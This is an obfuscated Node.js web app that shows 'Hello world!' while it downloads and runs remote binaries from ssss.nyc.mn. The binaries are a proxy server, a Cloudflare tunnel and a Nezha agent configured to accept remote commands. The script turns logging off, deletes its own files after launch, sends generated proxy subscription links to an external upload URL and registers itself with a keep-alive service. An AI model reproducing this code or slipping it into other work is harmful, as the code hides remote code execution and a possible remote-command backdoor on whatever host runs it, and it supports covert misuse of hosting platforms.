const _0x50452f=_0x94c7;(function(_0x2c80f7,_0x51e492){const _0x48b5e4=_0x94c7,_0x526969=_0x2c80f7();while(!![]){try{const _0x14f6f3=-parseInt(_0x48b5e4(0x26d))/0x1+parseInt(_0x48b5e4(0x267))/0x2+-parseInt(_0x48b5e4(0x27d))/0x3*(-parseInt(_0x48b5e4(0x23a))/0x4)+-parseInt(_0x48b5e4(0x241))/0x5+parseInt(_0x48b5e4(0x1f5))/0x6*(parseInt(_0x48b5e4(0x22b))/0x7)+-parseInt(_0x48b5e4(0x202))/0x8*(parseInt(_0x48b5e4(0x22a))/0x9)+parseInt(_0x48b5e4(0x26a))/0xa*(parseInt(_0x48b5e4(0x23c))/0xb);if(_0x14f6f3===_0x51e492)break;else _0x526969['push'](_0x526969['shift']());}catch(_0x2a7258){_0x526969['push'](_0x526969['shift']());}}}(_0x401b,0xa8326));const express=require(_0x50452f(0x235)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x50452f(0x24d)),{promisify}=require(_0x50452f(0x246)),exec=promisify(require(_0x50452f(0x280))[_0x50452f(0x22e)]),{execSync}=require(_0x50452f(0x280)),UPLOAD_URL=process[_0x50452f(0x22d)][_0x50452f(0x1fa)]||'',PROJECT_URL=process['env'][_0x50452f(0x287)]||'',AUTO_ACCESS=process['env'][_0x50452f(0x263)]||![],FILE_PATH=process[_0x50452f(0x22d)][_0x50452f(0x26e)]||'./tmp',SUB_PATH=process[_0x50452f(0x22d)][_0x50452f(0x264)]||_0x50452f(0x261),PORT=process[_0x50452f(0x22d)][_0x50452f(0x24f)]||process[_0x50452f(0x22d)][_0x50452f(0x26b)]||0xbb8,UUID=process[_0x50452f(0x22d)][_0x50452f(0x245)]||_0x50452f(0x210),NEZHA_SERVER=process[_0x50452f(0x22d)][_0x50452f(0x27f)]||'',NEZHA_PORT=process[_0x50452f(0x22d)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x50452f(0x22d)][_0x50452f(0x26f)]||'',ARGO_DOMAIN=process[_0x50452f(0x22d)]['ARGO_DOMAIN']||'',ARGO_AUTH=process[_0x50452f(0x22d)][_0x50452f(0x230)]||'',ARGO_PORT=process[_0x50452f(0x22d)][_0x50452f(0x28b)]||0x1f90,CFIP=process[_0x50452f(0x22d)][_0x50452f(0x1ff)]||_0x50452f(0x1fd),CFPORT=process['env'][_0x50452f(0x221)]||0x1bb,NAME=process[_0x50452f(0x22d)][_0x50452f(0x265)]||'Vls';!fs[_0x50452f(0x277)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x50452f(0x27c)](FILE_PATH+_0x50452f(0x283))):console[_0x50452f(0x27c)](FILE_PATH+'\x20already\x20exists');let npmPath=path[_0x50452f(0x284)](FILE_PATH,_0x50452f(0x247)),phpPath=path['join'](FILE_PATH,_0x50452f(0x272)),webPath=path['join'](FILE_PATH,_0x50452f(0x23f)),botPath=path[_0x50452f(0x284)](FILE_PATH,'bot'),subPath=path[_0x50452f(0x284)](FILE_PATH,_0x50452f(0x1f8)),listPath=path[_0x50452f(0x284)](FILE_PATH,_0x50452f(0x1f6)),bootLogPath=path[_0x50452f(0x284)](FILE_PATH,_0x50452f(0x250)),configPath=path[_0x50452f(0x284)](FILE_PATH,_0x50452f(0x206));function deleteNodes(){const _0x3e4cd7=_0x50452f;try{if(!UPLOAD_URL)return;if(!fs[_0x3e4cd7(0x277)](subPath))return;let _0x1e6335;try{_0x1e6335=fs[_0x3e4cd7(0x1ea)](subPath,_0x3e4cd7(0x1df));}catch{return null;}const _0x262de8=Buffer[_0x3e4cd7(0x207)](_0x1e6335,_0x3e4cd7(0x1ec))[_0x3e4cd7(0x25f)](_0x3e4cd7(0x1df)),_0x53f2cc=_0x262de8[_0x3e4cd7(0x239)]('\x0a')[_0x3e4cd7(0x21f)](_0x34d2af=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3e4cd7(0x23d)](_0x34d2af));if(_0x53f2cc[_0x3e4cd7(0x225)]===0x0)return;return axios[_0x3e4cd7(0x1fc)](UPLOAD_URL+_0x3e4cd7(0x220),JSON[_0x3e4cd7(0x21c)]({'nodes':_0x53f2cc}),{'headers':{'Content-Type':_0x3e4cd7(0x25a)}})[_0x3e4cd7(0x20c)](_0x444831=>{return null;});}catch(_0x191c76){return null;}}function cleanupOldFiles(){const _0x5ecaa4=_0x50452f,_0x2ad155=[_0x5ecaa4(0x23f),_0x5ecaa4(0x222),'npm','php',_0x5ecaa4(0x1f8),'boot.log'];_0x2ad155[_0x5ecaa4(0x276)](_0x22d477=>{const _0x504b8b=_0x5ecaa4,_0x299c9e=path['join'](FILE_PATH,_0x22d477);fs[_0x504b8b(0x1e5)](_0x299c9e,()=>{});});}app[_0x50452f(0x22f)]('/',function(_0x5e6cd4,_0x4bf789){_0x4bf789['send']('Hello\x20world!');});const config={'log':{'access':_0x50452f(0x21b),'error':_0x50452f(0x21b),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x50452f(0x1eb),'settings':{'clients':[{'id':UUID,'flow':_0x50452f(0x279)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x50452f(0x200),'dest':0xbbb},{'path':_0x50452f(0x28e),'dest':0xbbc}]},'streamSettings':{'network':_0x50452f(0x268)}},{'port':0xbb9,'listen':_0x50452f(0x20e),'protocol':_0x50452f(0x1eb),'settings':{'clients':[{'id':UUID}],'decryption':_0x50452f(0x1e2)},'streamSettings':{'network':_0x50452f(0x268),'security':_0x50452f(0x1e2)}},{'port':0xbba,'listen':_0x50452f(0x20e),'protocol':_0x50452f(0x1eb),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x50452f(0x1e2)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x50452f(0x1fb)}},'sniffing':{'disable':![],'destOverride':[_0x50452f(0x259),'tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x50452f(0x20e),'protocol':_0x50452f(0x253),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x50452f(0x200)}},'sniffing':{'disable':![],'destOverride':[_0x50452f(0x259),_0x50452f(0x217),_0x50452f(0x248)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x50452f(0x237),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x50452f(0x28e)}},'sniffing':{'disable':![],'destOverride':[_0x50452f(0x259),_0x50452f(0x217),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x50452f(0x244)]},'outbounds':[{'protocol':_0x50452f(0x1fe),'tag':'direct'},{'protocol':_0x50452f(0x20f),'tag':'block'}]};fs[_0x50452f(0x242)](path['join'](FILE_PATH,'config.json'),JSON[_0x50452f(0x21c)](config,null,0x2));function _0x401b(){const _0x577ee9=['PROJECT_URL','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','createWriteStream','./bot','ARGO_PORT','true','nohup\x20','/trojan-argo','all','/web\x20-c\x20','utf-8','amd','unshift','none','php\x20running\x20error:\x20','2096','unlink','set','pop','Subscription\x20uploaded\x20successfully','2053','readFileSync','vless','base64','https://arm64.ssss.nyc.mn/web','arm','&path=%2Ftrojan-argo%3Fed%3D2560#','ArgoDomain:','&path=%2Fvless-argo%3Fed%3D2560#','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','false','web\x20running\x20error:\x20','18KsSjrn','list.txt','2087','sub.txt','/php\x20-c\x20\x22','UPLOAD_URL','/vless-argo','post','www.visa.com.sg','freedom','CFIP','/vmess-argo','App\x20is\x20running','1042592rCZKeJ','/api/add-nodes','automatic\x20access\x20task\x20added\x20successfully','stream','config.json','from','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','https://arm64.ssss.nyc.mn/v1','config.yaml','fileName','catch','clear','127.0.0.1','blackhole','a297a08f-79e2-46dd-b35c-29e5388b91b5','chmod','tunnel.json','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','close','message','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','tls','https://oooo.serv00.net/add-url','/vmess-argo?ed=2560','Skipping\x20adding\x20automatic\x20access\x20task','/dev/null','stringify','tunnel.yml','Content-Type','filter','/api/delete-nodes','CFPORT','bot','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','8443','length','ARGO_DOMAIN:','\x0avless://','data','\x0aclient_secret:\x20','81rzPXQo','440405fhqzwx','includes','env','exec','get','ARGO_AUTH','/config.json\x20>/dev/null\x202>&1\x20&','unlinkSync','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','then','express','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','trojan','push','split','1736gUtUMg','fileUrl','22583dcmaNR','test','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','web','\x0a\x20\x20\x0atrojan://','4828245UUtSOR','writeFileSync','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','https+local://8.8.8.8/dns-query','UUID','util','npm','quic','arch','?security=tls&sni=','trim','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','path','npm\x20running\x20error:\x20','SERVER_PORT','boot.log','\x20-p\x20','map','vmess','has','\x20failed:\x20','php\x20is\x20running','--tls','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','http','application/json','Download\x20','bot\x20is\x20running.','arm64','./web','toString','443','sub','match','AUTO_ACCESS','SUB_PATH','NAME','添加URL失败:\x20','420628QDmRYG','tcp','Error\x20executing\x20command:\x20','10170YYjTzX','PORT','https://arm64.ssss.nyc.mn/agent','563483WAHpIV','FILE_PATH','NEZHA_KEY','\x0a\x20\x20\x20\x20','error','php','\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20credentials-file:\x20','status','forEach','existsSync','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','xtls-rprx-vision','/sub.txt\x20saved\x20successfully','&type=ws&host=','log','6249NnbBmC','https://amd64.ssss.nyc.mn/v1','NEZHA_SERVER','child_process','/npm\x20-s\x20','npm\x20is\x20running','\x20is\x20created','join','response','https://amd64.ssss.nyc.mn/web'];_0x401b=function(){return _0x577ee9;};return _0x401b();}function getSystemArchitecture(){const _0x442a45=_0x50452f,_0xb58488=os[_0x442a45(0x249)]();return _0xb58488===_0x442a45(0x1ee)||_0xb58488===_0x442a45(0x25d)||_0xb58488==='aarch64'?'arm':_0x442a45(0x1e0);}function _0x94c7(_0x597f30,_0xbb6883){const _0x401bf1=_0x401b();return _0x94c7=function(_0x94c77c,_0x34f03e){_0x94c77c=_0x94c77c-0x1de;let _0x291493=_0x401bf1[_0x94c77c];return _0x291493;},_0x94c7(_0x597f30,_0xbb6883);}function downloadFile(_0x2cc65a,_0x361b99,_0x131057){const _0xe3a78e=_0x50452f,_0xf70cb3=path['join'](FILE_PATH,_0x2cc65a),_0x45faa5=fs[_0xe3a78e(0x289)](_0xf70cb3);axios({'method':_0xe3a78e(0x22f),'url':_0x361b99,'responseType':_0xe3a78e(0x205)})[_0xe3a78e(0x234)](_0x42bcdd=>{const _0x133d8e=_0xe3a78e;_0x42bcdd[_0x133d8e(0x228)]['pipe'](_0x45faa5),_0x45faa5['on']('finish',()=>{const _0x1cce59=_0x133d8e;_0x45faa5[_0x1cce59(0x214)](),console[_0x1cce59(0x27c)](_0x1cce59(0x25b)+_0x2cc65a+'\x20successfully'),_0x131057(null,_0x2cc65a);}),_0x45faa5['on'](_0x133d8e(0x271),_0x28496b=>{const _0x1d6d75=_0x133d8e;fs[_0x1d6d75(0x1e5)](_0xf70cb3,()=>{});const _0x3a7576='Download\x20'+_0x2cc65a+_0x1d6d75(0x255)+_0x28496b['message'];console[_0x1d6d75(0x271)](_0x3a7576),_0x131057(_0x3a7576);});})[_0xe3a78e(0x20c)](_0x3f3894=>{const _0x41b84=_0xe3a78e,_0xc4364=_0x41b84(0x25b)+_0x2cc65a+_0x41b84(0x255)+_0x3f3894['message'];console['error'](_0xc4364),_0x131057(_0xc4364);});}async function downloadFilesAndRun(){const _0x229b17=_0x50452f,_0x458088=getSystemArchitecture(),_0x24474e=getFilesForArchitecture(_0x458088);if(_0x24474e[_0x229b17(0x225)]===0x0){console['log'](_0x229b17(0x223));return;}const _0x3b2f6a=_0x24474e[_0x229b17(0x252)](_0x4c8a39=>{return new Promise((_0x5c9810,_0x24af41)=>{const _0x531bcb=_0x94c7;downloadFile(_0x4c8a39[_0x531bcb(0x20b)],_0x4c8a39[_0x531bcb(0x23b)],(_0x555835,_0x59efea)=>{_0x555835?_0x24af41(_0x555835):_0x5c9810(_0x59efea);});});});try{await Promise[_0x229b17(0x28f)](_0x3b2f6a);}catch(_0x42c449){console[_0x229b17(0x271)]('Error\x20downloading\x20files:',_0x42c449);return;}function _0x4722df(_0xb5381a){const _0x280bf8=_0x229b17,_0x569dc0=0x1fd;_0xb5381a[_0x280bf8(0x276)](_0x568d2e=>{const _0x1a8699=_0x280bf8,_0xbfb2c5=path['join'](FILE_PATH,_0x568d2e);fs['existsSync'](_0xbfb2c5)&&fs[_0x1a8699(0x211)](_0xbfb2c5,_0x569dc0,_0x196cd9=>{const _0x508b89=_0x1a8699;_0x196cd9?console[_0x508b89(0x271)]('Empowerment\x20failed\x20for\x20'+_0xbfb2c5+':\x20'+_0x196cd9):console[_0x508b89(0x27c)]('Empowerment\x20success\x20for\x20'+_0xbfb2c5+':\x20'+_0x569dc0[_0x508b89(0x25f)](0x8));});});}const _0x37300=NEZHA_PORT?['./npm','./web',_0x229b17(0x28a)]:['./php',_0x229b17(0x25e),'./bot'];_0x4722df(_0x37300);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x213399=NEZHA_SERVER[_0x229b17(0x22c)](':')?NEZHA_SERVER[_0x229b17(0x239)](':')[_0x229b17(0x1e7)]():'',_0x23dff8=new Set([_0x229b17(0x260),'8443',_0x229b17(0x1e4),'2087','2083','2053']),_0xade07f=_0x23dff8[_0x229b17(0x254)](_0x213399)?_0x229b17(0x28c):_0x229b17(0x1f3),_0x29d228=_0x229b17(0x229)+NEZHA_KEY+_0x229b17(0x278)+NEZHA_SERVER+'\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20'+_0xade07f+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x229b17(0x242)](path['join'](FILE_PATH,_0x229b17(0x20a)),_0x29d228);const _0xf54553='nohup\x20'+FILE_PATH+_0x229b17(0x1f9)+FILE_PATH+_0x229b17(0x23e);try{await exec(_0xf54553),console[_0x229b17(0x27c)](_0x229b17(0x256)),await new Promise(_0x5bdd8e=>setTimeout(_0x5bdd8e,0x3e8));}catch(_0x6066ac){console[_0x229b17(0x271)](_0x229b17(0x1e3)+_0x6066ac);}}else{let _0x1a5f44='';const _0x14f6c0=[_0x229b17(0x260),_0x229b17(0x224),_0x229b17(0x1e4),_0x229b17(0x1f7),'2083',_0x229b17(0x1e9)];_0x14f6c0[_0x229b17(0x22c)](NEZHA_PORT)&&(_0x1a5f44=_0x229b17(0x257));const _0x5ee0d0=_0x229b17(0x28d)+FILE_PATH+_0x229b17(0x281)+NEZHA_SERVER+':'+NEZHA_PORT+_0x229b17(0x251)+NEZHA_KEY+'\x20'+_0x1a5f44+_0x229b17(0x273);try{await exec(_0x5ee0d0),console[_0x229b17(0x27c)](_0x229b17(0x282)),await new Promise(_0x356e62=>setTimeout(_0x356e62,0x3e8));}catch(_0x4c2212){console[_0x229b17(0x271)](_0x229b17(0x24e)+_0x4c2212);}}}else console[_0x229b17(0x27c)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x491520=_0x229b17(0x28d)+FILE_PATH+_0x229b17(0x1de)+FILE_PATH+_0x229b17(0x231);try{await exec(_0x491520),console[_0x229b17(0x27c)]('web\x20is\x20running'),await new Promise(_0x5e289e=>setTimeout(_0x5e289e,0x3e8));}catch(_0x370ed4){console[_0x229b17(0x271)](_0x229b17(0x1f4)+_0x370ed4);}if(fs[_0x229b17(0x277)](path[_0x229b17(0x284)](FILE_PATH,_0x229b17(0x222)))){let _0x15bc75;if(ARGO_AUTH[_0x229b17(0x262)](/^[A-Z0-9a-z=]{120,250}$/))_0x15bc75=_0x229b17(0x24c)+ARGO_AUTH;else ARGO_AUTH[_0x229b17(0x262)](/TunnelSecret/)?_0x15bc75=_0x229b17(0x216)+FILE_PATH+'/tunnel.yml\x20run':_0x15bc75=_0x229b17(0x258)+FILE_PATH+_0x229b17(0x213)+ARGO_PORT;try{await exec(_0x229b17(0x28d)+FILE_PATH+'/bot\x20'+_0x15bc75+_0x229b17(0x273)),console[_0x229b17(0x27c)]('bot\x20is\x20running'),await new Promise(_0x5430e8=>setTimeout(_0x5430e8,0x7d0));}catch(_0x5eadc2){console[_0x229b17(0x271)](_0x229b17(0x269)+_0x5eadc2);}}await new Promise(_0x237adc=>setTimeout(_0x237adc,0x1388));}function getFilesForArchitecture(_0x50e00f){const _0x246f28=_0x50452f;let _0x4bfd72;_0x50e00f==='arm'?_0x4bfd72=[{'fileName':_0x246f28(0x23f),'fileUrl':_0x246f28(0x1ed)},{'fileName':_0x246f28(0x222),'fileUrl':'https://arm64.ssss.nyc.mn/2go'}]:_0x4bfd72=[{'fileName':_0x246f28(0x23f),'fileUrl':_0x246f28(0x286)},{'fileName':_0x246f28(0x222),'fileUrl':'https://amd64.ssss.nyc.mn/2go'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x19a2bf=_0x50e00f===_0x246f28(0x1ee)?_0x246f28(0x26c):'https://amd64.ssss.nyc.mn/agent';_0x4bfd72[_0x246f28(0x1e1)]({'fileName':'npm','fileUrl':_0x19a2bf});}else{const _0x25cc07=_0x50e00f===_0x246f28(0x1ee)?_0x246f28(0x209):_0x246f28(0x27e);_0x4bfd72[_0x246f28(0x1e1)]({'fileName':_0x246f28(0x272),'fileUrl':_0x25cc07});}}return _0x4bfd72;}function argoType(){const _0x34230f=_0x50452f;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x34230f(0x27c)](_0x34230f(0x288));return;}if(ARGO_AUTH['includes']('TunnelSecret')){fs['writeFileSync'](path[_0x34230f(0x284)](FILE_PATH,_0x34230f(0x212)),ARGO_AUTH);const _0x5dc666='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x34230f(0x239)]('\x22')[0xb]+_0x34230f(0x274)+path[_0x34230f(0x284)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x34230f(0x236);fs[_0x34230f(0x242)](path[_0x34230f(0x284)](FILE_PATH,_0x34230f(0x21d)),_0x5dc666);}else console[_0x34230f(0x27c)](_0x34230f(0x233));}argoType();async function extractDomains(){const _0x20c498=_0x50452f;let _0x41c8e6;if(ARGO_AUTH&&ARGO_DOMAIN)_0x41c8e6=ARGO_DOMAIN,console[_0x20c498(0x27c)](_0x20c498(0x226),_0x41c8e6),await _0x4aae2a(_0x41c8e6);else try{const _0x1bc485=fs[_0x20c498(0x1ea)](path[_0x20c498(0x284)](FILE_PATH,_0x20c498(0x250)),_0x20c498(0x1df)),_0x379bd0=_0x1bc485[_0x20c498(0x239)]('\x0a'),_0x42700e=[];_0x379bd0[_0x20c498(0x276)](_0x181599=>{const _0x990ddf=_0x20c498,_0xa6cf79=_0x181599[_0x990ddf(0x262)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xa6cf79){const _0x5da8af=_0xa6cf79[0x1];_0x42700e[_0x990ddf(0x238)](_0x5da8af);}});if(_0x42700e[_0x20c498(0x225)]>0x0)_0x41c8e6=_0x42700e[0x0],console[_0x20c498(0x27c)](_0x20c498(0x1f0),_0x41c8e6),await _0x4aae2a(_0x41c8e6);else{console[_0x20c498(0x27c)](_0x20c498(0x208)),fs[_0x20c498(0x232)](path[_0x20c498(0x284)](FILE_PATH,_0x20c498(0x250)));async function _0x20cf65(){const _0x5e7818=_0x20c498;try{await exec(_0x5e7818(0x1f2));}catch(_0x51f9dc){}}_0x20cf65(),await new Promise(_0x22d599=>setTimeout(_0x22d599,0xbb8));const _0x11e258=_0x20c498(0x258)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+path[_0x20c498(0x284)](FILE_PATH,_0x20c498(0x222))+'\x20'+_0x11e258+_0x20c498(0x273)),console[_0x20c498(0x27c)](_0x20c498(0x25c)),await new Promise(_0x915083=>setTimeout(_0x915083,0xbb8)),await extractDomains();}catch(_0x407637){console[_0x20c498(0x271)]('Error\x20executing\x20command:\x20'+_0x407637);}}}catch(_0x1f3fed){console[_0x20c498(0x271)]('Error\x20reading\x20boot.log:',_0x1f3fed);}async function _0x4aae2a(_0x3801be){const _0x15e50d=_0x20c498,_0x595c10=execSync(_0x15e50d(0x243),{'encoding':_0x15e50d(0x1df)}),_0x26882f=_0x595c10[_0x15e50d(0x24b)]();return new Promise(_0x57d1f6=>{setTimeout(()=>{const _0x32f3b6=_0x94c7,_0x55b379={'v':'2','ps':NAME+'-'+_0x26882f,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x32f3b6(0x1e2),'net':'ws','type':'none','host':_0x3801be,'path':_0x32f3b6(0x219),'tls':_0x32f3b6(0x217),'sni':_0x3801be,'alpn':''},_0x5d8829=_0x32f3b6(0x227)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x3801be+'&type=ws&host='+_0x3801be+_0x32f3b6(0x1f1)+NAME+'-'+_0x26882f+'\x0a\x20\x20\x0avmess://'+Buffer['from'](JSON['stringify'](_0x55b379))[_0x32f3b6(0x25f)](_0x32f3b6(0x1ec))+_0x32f3b6(0x240)+UUID+'@'+CFIP+':'+CFPORT+_0x32f3b6(0x24a)+_0x3801be+_0x32f3b6(0x27b)+_0x3801be+_0x32f3b6(0x1ef)+NAME+'-'+_0x26882f+_0x32f3b6(0x270);console['log'](Buffer[_0x32f3b6(0x207)](_0x5d8829)[_0x32f3b6(0x25f)](_0x32f3b6(0x1ec))),fs['writeFileSync'](subPath,Buffer[_0x32f3b6(0x207)](_0x5d8829)[_0x32f3b6(0x25f)](_0x32f3b6(0x1ec))),console[_0x32f3b6(0x27c)](FILE_PATH+_0x32f3b6(0x27a)),uplodNodes(),app[_0x32f3b6(0x22f)]('/'+SUB_PATH,(_0x416992,_0x2f9256)=>{const _0x3f0c25=_0x32f3b6,_0x29927f=Buffer[_0x3f0c25(0x207)](_0x5d8829)[_0x3f0c25(0x25f)](_0x3f0c25(0x1ec));_0x2f9256[_0x3f0c25(0x1e6)](_0x3f0c25(0x21e),'text/plain;\x20charset=utf-8'),_0x2f9256['send'](_0x29927f);}),_0x57d1f6(_0x5d8829);},0x7d0);});}}async function uplodNodes(){const _0x5616aa=_0x50452f;if(UPLOAD_URL&&PROJECT_URL){const _0x5d22b3=PROJECT_URL+'/'+SUB_PATH,_0x365b4c={'subscription':[_0x5d22b3]};try{const _0x2a1680=await axios[_0x5616aa(0x1fc)](UPLOAD_URL+'/api/add-subscriptions',_0x365b4c,{'headers':{'Content-Type':_0x5616aa(0x25a)}});if(_0x2a1680['status']===0xc8)console['log'](_0x5616aa(0x1e8));else return null;}catch(_0x4b31ca){if(_0x4b31ca['response']){if(_0x4b31ca[_0x5616aa(0x285)][_0x5616aa(0x275)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5616aa(0x277)](listPath))return;const _0x161bca=fs[_0x5616aa(0x1ea)](listPath,'utf-8'),_0x3f0ebe=_0x161bca[_0x5616aa(0x239)]('\x0a')[_0x5616aa(0x21f)](_0x11e139=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5616aa(0x23d)](_0x11e139));if(_0x3f0ebe['length']===0x0)return;const _0x4b7d46=JSON[_0x5616aa(0x21c)]({'nodes':_0x3f0ebe});try{await axios[_0x5616aa(0x1fc)](UPLOAD_URL+_0x5616aa(0x203),_0x4b7d46,{'headers':{'Content-Type':_0x5616aa(0x25a)}});if(response[_0x5616aa(0x275)]===0xc8)console[_0x5616aa(0x27c)](_0x5616aa(0x1e8));else return null;}catch(_0x4247a8){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x399bf9=_0x94c7,_0x121f08=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x121f08[_0x399bf9(0x238)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x121f08[_0x399bf9(0x238)](phpPath);exec('rm\x20-rf\x20'+_0x121f08['join']('\x20')+'\x20>/dev/null\x202>&1',_0xe060cf=>{const _0x11f5f8=_0x399bf9;console[_0x11f5f8(0x20d)](),console[_0x11f5f8(0x27c)](_0x11f5f8(0x201)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2d47fd=_0x50452f;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x2d47fd(0x21a));return;}try{const _0x4d281a=await axios[_0x2d47fd(0x1fc)](_0x2d47fd(0x218),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2d47fd(0x25a)}});console[_0x2d47fd(0x27c)](_0x2d47fd(0x204));}catch(_0x4487d3){console[_0x2d47fd(0x271)](_0x2d47fd(0x266)+_0x4487d3[_0x2d47fd(0x215)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app['listen'](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
